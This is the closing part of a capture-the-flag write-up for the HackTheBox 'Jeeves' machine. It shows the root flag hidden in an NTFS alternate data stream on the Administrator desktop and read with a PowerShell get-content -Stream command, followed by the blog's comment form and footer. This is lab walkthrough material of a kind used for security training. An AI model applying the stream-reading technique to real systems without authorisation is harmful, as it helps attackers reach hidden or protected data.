+<span class="go">12/24/2017  03:51 AM                36 hm.txt</span>
+<span class="go">                                    34 hm.txt:root.txt:$DATA</span>
+<span class="go">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span>
+<span class="go">               2 File(s)            833 bytes</span>
+<span class="go">               2 Dir(s)   7,533,301,760 bytes free</span>
+</pre></div>
+
+
+<p>So we see another file, <code>hm.txt:root.txt:$DATA</code> which we can read it using this command:</p>
+<div class="highlight"><pre><span></span><span class="go">C:#Users#Administrator#Desktop&gt;powershell (get-content hm.txt -Stream root.txt)</span>
+
+<span class="go">af****************************30</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Jeeves.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Jeeves"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
